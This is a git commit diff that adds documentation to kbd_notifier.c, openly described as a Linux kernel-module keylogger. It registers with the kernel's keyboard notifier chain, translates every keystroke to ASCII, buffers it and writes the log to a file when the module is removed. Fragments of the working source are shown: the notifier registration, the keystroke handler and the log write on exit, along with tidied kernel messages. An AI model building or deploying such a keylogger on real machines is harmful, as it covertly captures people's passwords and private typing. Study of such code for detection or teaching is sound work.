cf73956bd9d08485252ee11dabb073c80b231891
Enrique Naudon <enaudoncs@gmail.com>
2011-12-07 19:34:41 -0500

    added documentation for kbd_notifier.c

--- loggers/kbd_notifier/kbd_notifier.c
+++ loggers/kbd_notifier/kbd_notifier.c
@@ -1,3 +1,42 @@
+/* ===========================
+ * Keyboard Notifier Keylogger
+ * ===========================
+ *
+ * Description:
+ * -----------
+ *      This is a kernel-based keylogger written for linux.  It is (most
+ * unoriginally) named kbd_notifier, after its method of capturing keystrokes.
+ * To do its keylogging, kbd_notifier abuses the linux notifier chains, through
+ * which kernel modules may request notice when a kernel event occurs.
+ * kbd_notifier registers for notification when keystrokes occur, and simply
+ * logs each keystroke as it happens.
+ *
+ * Translation:
+ * -----------
+ *      In order to register for notification of keyboard events, kdb_notifier
+ * registers a callback function with the notifier chain.  When a keystroke
+ * occurs, the notifier chain calls kbd_notifier's callback, and passes a
+ * pointer to a keyboard_notifier_param structure, which contains information
+ * about the keystroke.  The keyboard_notifier_param does not provide an ascii
+ * representation of each keystoke, so kbd_notifier must do some translation in
+ * order to get human-readable information to log.  This translation is done
+ * using the methods in the keysym.h header file.
+ *
+ * Logging:
+ * -------
+ *      After translation, the ascii representation of each keystroke is
+ * appended to a (very large) buffer.  The contents of this buffer is stored to
+ * a file when the module is removed from the system.  This is obviously not a
+ * great way of storing the logged keystrokes, but it is done this beacause
+ * there is some issue with writting to files from withing a function called by
+ * an interrupt handler (meaning that logging from a timer callback won't work
+ * either).  The "right" way to handle would be to make the contents of the
+ * buffer available to user-space (via the /proc or /sys file systems), and
+ * have a user space program write the keystrokes to a file.  Alas, I am lazy,
+ * so I took the easy approach.
+ *
+ * 
+ */
 #include <linux/init.h>
 #include <linux/module.h>
 
@@ -41,29 +80,35 @@ int kstroke_handler(struct notifier_block *nb,
       //we'll grab keys further down the line disc (once the kernel has done
       //some work for us)
       break;
+
     case KBD_UNBOUND_KEYCODE:
-      printk(KERN_ALERT "Unbound\n");
-      break;
     case KBD_UNICODE :
-      printk(KERN_ALERT "Unicode   : %x\n", kbd_np->value);
+      //for simplicity, we keyboard events when the keyboard sends us unicode.
+      //unicode is used for special function keys--not the f-keys, but stuff
+      //like extra media keys (i.e. play, pause, etc.) or web-navigation keys
+      //(i.e. home, refresh, etc).
       break;
+
     case KBD_KEYSYM :
       //igore key symbols *for now*
       //as before, the kernel will do a little more work for us
       break;
+
     case KBD_POST_KEYSYM :
       //now grab key symbols and translate them
       xlate_keysym(kbd_np, trans);
       break;
+
     default :
-      printk(KERN_ALERT "Really not sure what happend\n");
+      //this should never get executed
+      printk(KERN_ALERT "KBD_N - Error: Unknown keyboard mode.\n");
       break;
   }
   return 0;
 }
 
 static int hello_init(void) {
-  printk(KERN_ALERT "Hello, world!\n");
+  printk(KERN_ALERT "KBD_N - Installing kbd_notifier.\n");
 
   //notice when a key is pressed?  yes, please!
   register_keyboard_notifier(&nb);
@@ -81,7 +126,7 @@ static void hello_exit(void) {
   kwrite(log, 0, trans, strlen(trans));
   kclose(log);
 
-  printk(KERN_ALERT "Goobye, world!\n");
+  printk(KERN_ALERT "KBD_N - kbd_notifier removed.\n");
 }
 
 MODULE_LICENSE("GPL");
